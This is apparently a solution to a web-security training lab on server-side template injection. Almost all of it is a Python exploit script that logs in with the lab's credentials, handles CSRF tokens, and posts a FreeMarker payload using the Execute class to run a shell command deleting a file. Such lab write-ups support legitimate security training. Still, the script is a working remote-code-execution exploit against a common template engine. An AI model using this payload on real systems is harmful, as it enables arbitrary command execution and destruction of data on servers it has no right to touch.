# Server-side template injection using documentation
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
> You can log in to your own account using the following credentials:
> `content-manager:C0nt3ntM4n4g3r`

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Server-side template injection using documentation
# GOAL: Exploit FreeMarker template engine to execute 'rm' command
BASE_URL = "https://0a5e000403516ad2826e7487007c004d.web-security-academy.net"
LOGIN_ENDPOINT = BASE_URL + "/login"
# The injection point is inside the template editor for a product
TEMPLATE_ENDPOINT = BASE_URL + "/product/template?productId=1"

def get_csrf_token(session, url):
    """
    Helper to extract the Anti-CSRF token from a given page.
    """
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find("input", {"name": "csrf"})['value']

def create_authenticated_session(url):
    """
    Logs in as the content-manager to establish a privileged session.
    """
    print(f"[*] Connecting to login page...")
    session = requests.Session()
    
    # 1. Fetch Login CSRF
    csrf_token = get_csrf_token(session, url)
    
    # 2. Perform Login
    credentials = {
        "username": "content-manager",
        "password": "C0nt3ntM4n4g3r",
        "csrf": csrf_token
    }
    
    print("[*] Authenticating as content-manager...")
    response = session.post(url, data=credentials)
    
    # Verify Login
    if "Log out" in response.text:
        print("[+] Authentication Successful.")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def exploit_freemarker_ssti(target_url, session):
    """
    Injects a FreeMarker specific payload to execute arbitrary commands.
    """
    print(f"[*] Targeting Template Editor at: {target_url}")
    
    # 1. Get fresh CSRF token for the template editor form
    # Note: Tokens often rotate per form/page in these labs
    exploit_csrf = get_csrf_token(session, target_url)
    
    # 2. Construct Payload
    # Engine: FreeMarker (Java-based)
    # Vector: The 'freemarker.template.utility.Execute' class allows command execution.
    # Syntax: ${ ... } is the interpolation syntax. 
    # ?new() instantiates the class.
    cmd = "rm /home/carlos/morale.txt"
    payload_string = f"${{'freemarker.template.utility.Execute'?new()('{cmd}')}}"
    
    # 3. Prepare POST Data
    # 'template-action': 'preview' forces the server to render our malicious template immediately
    data = {
        "template": payload_string,
        "csrf": exploit_csrf,
        "template-action": "preview"
    }
    
    print(f"[*] Sending Payload: {payload_string}")
    response = session.post(target_url, data=data)
    
    # 4. Verify Success
    # The lab updates the banner immediately upon successful deletion
    if "Congratulations" in response.text:
        print("[SUCCESS] Target file 'morale.txt' deleted. Lab Solved.")
    else:
        print("[-] Exploit sent, but success banner not detected. Check manually.")
        # Debug: Check if command output appears in preview
        # print(response.text[:500])

if __name__ == "__main__":
    session = create_authenticated_session(LOGIN_ENDPOINT)
    exploit_freemarker_ssti(TEMPLATE_ENDPOINT, session)
```